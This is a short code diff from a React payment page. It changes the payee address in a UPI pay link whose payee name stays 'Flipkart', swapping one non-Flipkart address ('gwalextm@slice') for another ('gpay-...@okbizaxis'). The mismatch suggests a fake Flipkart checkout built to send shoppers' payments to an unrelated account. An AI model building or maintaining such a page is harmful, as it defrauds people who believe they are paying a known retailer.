@@ -45,7 +45,7 @@ function PaymentPage() {
           </p>
         </div>
       )}
-      <a href={`upi://pay?pa=gwalextm@slice&pn=Flipkart&am=${amount}&cu=INR&tn=Payment%20via%20Google%20Pay`}>
+      <a href={`upi://pay?pa=gpay-11176859178@okbizaxis&pn=Flipkart&am=${amount}&cu=INR&tn=Payment%20via%20Google%20Pay`}>
       <button
         className="mt-8 bg-blue-500 text-white px-6 py-3 rounded-full shadow-lg"
         >
